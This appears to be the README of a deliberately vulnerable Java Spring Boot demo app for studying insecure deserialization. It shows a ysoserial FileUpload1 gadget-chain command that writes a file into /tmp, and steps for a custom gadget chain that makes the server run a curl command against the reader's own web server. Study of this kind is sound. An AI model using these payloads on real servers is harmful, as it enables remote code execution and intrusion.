* How to Run:
  - Run via `mvn spring-boot:run`

* Routes:
  - Read `blub.txt` file: Visit `/file-test?file=blub.txt`
  - Serialize:
    - Get a serialized `Book` object: Visit `/serialize?doUrlEncode=false`
    - Get a serialized `Book` object that is also URL encoded: Visit `/serialize?doUrlEncode=true`
  - Deserialize:
    - `GET`: Visit `GET /deserialize?b=<base64book_UrlEncoded>`
    - `POST`: Visit `POST /deserialize` and provide the `object-to-deserialize` in the body

* Exploiting a `Gadget Chain` (that still works as of August 2022!):
  - As a PoC, the `pom.xml` contains `commons-fileupload:1.3.1` and `commons-io:2.4`
  - Thus, we can use the `FileUpload1` gadget chain from `ysoserial`: `java -jar ysoserial.jar FileUpload1 'write;/tmp;HACKEEED' | base64`
  - We send this to our `Spring Boot` app, which will create a randomly named file (e.g. `/tmp/upload_1e2897d1_aac7_4210_8911_57cbb6ac37c0_00000000.tmp`) in `/tmp` with the content `HACKEEED`

* We also created our own `Gadget Chain` -> `BookRceReadObject` (uses the gadget `readObject`)
  * `General Description`:
    - We created a new class `BookRceReadObject.java` that execute a command upon deserialization
    - We also create a separate mini app `Evil.java` where we serialize an instance of this class, give it a command of our choosing, and then send the serialized base64-encoded string to `POST /deserialize`
  * `Command to Execute`:
    - You can adjust the command to execute in `Evil.java` (this can't be done via a command line argument for now - Boo, I know.)
  * `Setup`:
    - We first compile `Evil.java` via `javac Evil.java BookRceSetter.java BookRceSetter.java`
    - Now, we `cd` into the `/src/main/java` folder, and run `java com.example.my.tests.Evil`
    - We now use the generated file `naughty_BookRceReadObject.ser` that contains a base64 encoded version of our serialized payload
  * `Exploitation`:
    - `PoC` - `curl`:
      - We run a web server via `python3 -m http.server 82`
      - Now, we adjust the IP address of the `curl` command in `Evil.java` to wherever this web server is running
      - Last, we send a request to our API:
        POST /deserialize  
        Content-Type: application/json  
        <br />  
        <content of `naughty_BookRceReadObject.ser`>  
      - If everything works, our web server gets hit

* Testing `Setter Gadget Chain` -> Not working
  - We also create `BookRceSetter.java` which would execute a command upon calling a setter
    - Our idea is that a `setter` might be automatically invoked upon deserialization (to set the corresponding value)
  - We do the same steps as in the above section, send the payload from `naughty_BookRceSetter.ser` to `/POST deserialize`...
    - But it's not working.. Our command does not execute...
  